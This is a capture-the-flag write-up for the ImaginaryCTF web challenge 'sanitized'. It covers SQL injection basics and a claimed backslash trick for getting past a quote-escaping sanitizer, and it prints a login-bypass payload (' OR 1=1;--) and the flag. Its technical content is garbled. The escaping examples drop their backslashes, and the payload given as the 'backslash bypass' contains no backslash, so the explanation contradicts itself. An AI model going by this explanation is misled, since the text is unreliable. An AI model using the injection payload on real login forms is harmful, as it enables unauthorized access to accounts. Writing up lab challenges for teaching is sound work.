# sanitized — ImaginaryCTF Writeup

**Challenge:** sanitized  
**Category:** Web  
**Difficulty:** Medium  
**Points:** 65 pts  
**Flag:** `ictf{baby's_first_time_writing_web!_NDy3MOvyplcw}`

---

## Description

> your input is sanitized. gg

**Site:** `http://155.248.210.243:42380/`

---

## Background Knowledge (Read This First!)

### What is SQL Injection?

**SQL Injection** is an attack where you insert SQL code into an input field that gets executed by the database. A classic example:

```sql
' OR 1=1;--
```

This closes the current string, adds a condition that is always true (`1=1`), and comments out the rest of the query — bypassing login.

### What is "sanitization"?

**Sanitization** means escaping special characters (like `'`) to prevent SQL injection. A common approach is to add a backslash before quotes: `'` → `'`.

### What is the Bypass?

The sanitizer adds a backslash before quotes. But if you send a **backslash first**, the sanitizer's own backslash escapes YOUR backslash — leaving the quote unescaped!

```
Input:   '
Sanitized: \'   ← your backslash escapes the sanitizer's backslash
                   leaving the quote ' raw and injectable!
```

---

## Solution

### Step 1 — Open the site and find the login form

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ firefox "http://155.248.210.243:42380/"
```

### Step 2 — Inject with the backslash bypass

In the **username** field enter:

```
' OR 1=1;--
```

In the **password** field enter anything:

```
password
```

### Step 3 — Log in and get the flag

The SQL injection bypasses authentication and logs you in as admin:

```
ictf{baby's_first_time_writing_web!_NDy3MOvyplcw}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| Browser | Submit the SQL injection payload | ⭐ Easy |

---

## Key Takeaways

- A sanitizer that adds `\` before quotes is bypassed by sending `\` first — your backslash escapes theirs
- **Backslash escaping backslash** is a classic sanitizer bypass technique
- The sanitizer must escape backslashes BEFORE escaping quotes to be safe
- Always test `\'` when a site claims to sanitize single quotes
